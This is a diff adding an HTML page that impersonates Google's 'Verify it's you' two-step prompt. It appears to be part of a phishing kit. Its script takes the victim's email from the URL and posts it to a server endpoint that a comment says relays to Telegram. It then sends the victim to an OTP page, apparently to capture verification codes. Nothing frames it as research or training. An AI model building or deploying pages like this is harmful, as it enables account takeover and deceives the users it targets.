@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verify it's you - Google Accounts</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="icon" type="image/x-icon" href="images/google-logo-vector-format-white-background-illustration-407571050.webp">
+    <style>
+        :root {
+            --gmail-blue: #1a73e8;
+            --gmail-red: #ea4335;
+            --gmail-green: #34a853;
+            --gmail-white: #ffffff;
+            --gmail-gray: #5f6368;
+            --gmail-border: #dadce0;
+        }
+
+        * { box-sizing: border-box; }
+
+        html, body {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            min-height: 100%;
+            font-family: 'Roboto', sans-serif;
+            background: var(--gmail-white);
+            color: #202124;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 450px;
+            margin: 0 auto;
+            padding: 48px 36px;
+        }
+
+        .logo {
+            width: 75px;
+            height: 25px;
+            margin-bottom: 24px;
+            background: url('images/google-logo-vector-format-white-background-illustration-407571050.webp') no-repeat center;
+            background-size: contain;
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 16px;
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: var(--gmail-gray);
+            margin-bottom: 32px;
+        }
+
+        .phone-icon {
+            width: 100px;
+            height: 100px;
+            margin: 24px auto;
+            background: var(--gmail-blue);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .phone-icon::before {
+            content: '📱';
+            font-size: 48px;
+        }
+
+        .instruction {
+            text-align: center;
+            margin-bottom: 32px;
+        }
+
+        .instruction-title {
+            font-size: 16px;
+            margin-bottom: 8px;
+        }
+
+        .instruction-detail {
+            font-size: 14px;
+            color: var(--gmail-gray);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px 24px;
+            border: none;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-bottom: 12px;
+        }
+
+        .btn-primary {
+            background: var(--gmail-blue);
+            color: white;
+        }
+
+        .btn-primary:hover {
+            background: #1557b0;
+        }
+
+        .btn-secondary {
+            background: white;
+            color: var(--gmail-blue);
+            border: 1px solid var(--gmail-border);
+        }
+
+        .btn-secondary:hover {
+            background: #f8f9fa;
+        }
+
+        .try-another {
+            text-align: center;
+            margin-top: 24px;
+        }
+
+        .try-another a {
+            color: var(--gmail-blue);
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .try-another a:hover {
+            text-decoration: underline;
+        }
+
+        .loading {
+            text-align: center;
+            padding: 20px;
+            display: none;
+        }
+
+        .spinner {
+            width: 24px;
+            height: 24px;
+            border: 3px solid var(--gmail-border);
+            border-top-color: var(--gmail-blue);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 16px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: #f8f9fa;
+            border-top: 1px solid var(--gmail-border);
+            padding: 16px 24px;
+            display: flex;
+            justify-content: space-between;
+        }
+
+        .footer-links a {
+            color: var(--gmail-gray);
+            text-decoration: none;
+            font-size: 12px;
+            margin-right: 16px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo"></div>
+        <h1 class="title">Verify it's you</h1>
+        <p class="subtitle">This device isn't recognized. For your security, Google wants to make sure it's really you.</p>
+
+        <div class="phone-icon"></div>
+
+        <div class="instruction">
+            <div class="instruction-title">A prompt was sent to your phone</div>
+            <div class="instruction-detail">Open the Gmail app to tap Yes on the prompt.</div>
+        </div>
+
+        <div id="loadingDiv" class="loading">
+            <div class="spinner"></div>
+            <p>Checking for response...</p>
+        </div>
+
+        <button id="yesBtn" class="btn btn-primary" onclick="tapYes()">Yes, it's me</button>
+        <button class="btn btn-secondary" onclick="tryAnother()">Try another way</button>
+
+        <div class="try-another">
+            <a href="#" onclick="resendPrompt()">Resend prompt</a>
+        </div>
+    </div>
+
+    <footer class="footer">
+        <div class="footer-links">
+            <a href="#">Help</a>
+            <a href="#">Privacy</a>
+            <a href="#">Terms</a>
+        </div>
+    </footer>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const email = urlParams.get('email') || '';
+
+        function tapYes() {
+            const btn = document.getElementById('yesBtn');
+            btn.textContent = 'Verifying...';
+            btn.disabled = true;
+
+            // Send verification to Telegram
+            const xhr = new XMLHttpRequest();
+            xhr.open('POST', '/api/next.php', true);
+            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    btn.textContent = 'Verified!';
+                    setTimeout(() => {
+                        // Redirect to OTP page or show success
+                        window.location.href = 'otp.html?email=' + encodeURIComponent(email);
+                    }, 1500);
+                }
+            };
+            xhr.send('di=' + encodeURIComponent(email) + '&device_verify=yes');
+        }
+
+        function tryAnother() {
+            window.location.href = 'otp.html?email=' + encodeURIComponent(email);
+        }
+
+        function resendPrompt() {
+            alert('A new prompt has been sent to your device.');
+        }
+    </script>
+</body>
+</html>
